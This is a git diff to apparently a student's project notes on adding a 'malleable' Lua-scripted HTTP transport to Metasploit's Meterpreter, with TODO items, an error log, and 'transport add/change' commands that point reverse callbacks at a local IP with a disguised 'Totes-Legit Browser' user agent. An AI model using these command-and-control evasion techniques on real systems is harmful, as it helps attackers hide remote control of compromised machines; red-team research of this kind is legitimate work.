@@ -274,13 +274,40 @@ sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 
 
 * Lua in metasploit framework is not that great due to dependencies on windows (over all)
 
-* don't completely terminate ssl, establish ssl connection to metasploit-framework
+* don't completely terminate ssl, establish ssl connection to metasploit-framework (reverse Proxy)
 
 * If meterpreter should quit when malleable communication is not working this needs to be implemented in LUA, also need to provide return value which ends the meterpreter process
 
 * Test Paranoid mode
 
 * Implement WinInet fallback
+
+* Need to check out `metasploit-framework/lib/msf/util/payload_cached_size.rb`
+
+* More dynamic IP address handling in reverse proxy and stuff
+
+* If we make a transport change with a wrong ip we spam request that will not work
+
+* __Copy the `_MetsrvTransportHttp` and make additional Malleable transport__
+
+* LUA script not set yet crashes meterpreter
+
+* Check out tools folder
+
+* This error
+		```
+		meterpreter > transport add -t reverse_httpms -l 192.168.42.201 -p 443 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1" -M "asdf"
+		[*] Adding new transport ...
+		timo[-] Error running command transport: NoMethodError undefined method `print_error' for #<Rex::Post::Meterpreter::ClientCore:0x0000557b755ec900>
+		```
+
+* -------------------config_create-------------- TODO IMPORTANT Line310
+
+* NULL-Bytes in LUA skripten
+
+* [-] core_transport_add: Operation failed: 7000
+
+* Do I want to support control commands (special malleable encode/decode return strings) ? 
 
 # Bisherige Schritte
 
@@ -294,7 +321,10 @@ sudo docker build -t myopenresty -f bionic/Dockerfile .;sudo docker run -p80:80 
 
 * `/home/timo/Tools/bachelor/metasploit-framework/lib/rex/post/meterpreter`
 
-* `transport add -t reverse_mhttp -l 192.168.42.131 -p 5555 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"`
+* `transport add -t reverse_httpms -l 192.168.42.201 -p 443 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"`
+* `transport add -t reverse_httpm -l 192.168.42.201 -p 443 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"`
+* `transport add -t reverse_httpms -l 192.168.42.201 -p 443 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1" -M "/home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/meterpreter_malleable.lua"`
+* `transport change -t reverse_httpms -l 192.168.42.201 -p 443 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1" -M "/home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/malleableScript_characterlimit.lua"`
 
 Generate pem `openssl req -x509 -newkey rsa:4096 -keyout malleable_key.pem -out malleable_cert.pem -days 7300 -nodes -subj '/CN=localhost'`
 
@@ -304,7 +334,7 @@ Generate pem `openssl req -x509 -newkey rsa:4096 -keyout malleable_key.pem -out 
 git fetch upstream
 git pull upstream master
 
-to copy the custom .dlls to the linux system and build the meterpreter in metasploit-framework we need to run `buildAndCopyMeterpreter.sh`
+to copy the custom .dlls to the linux system and build the meterpreter in metasploit-framework we need to run `buildAndCopyMeterpreter.sh` or `~/Projects/bachelor/buildAndCopyMeterpreter_remote_debugging.sh`
 
 `/home/timo/.gem/ruby/2.6.0/gems/ruby-debug-ide-0.7.0.beta7/bin/rdebug-ide --host 127.0.0.1 --port 1234 -- ~/Tools/bachelor/metasploit-framework/msfconsole`
 
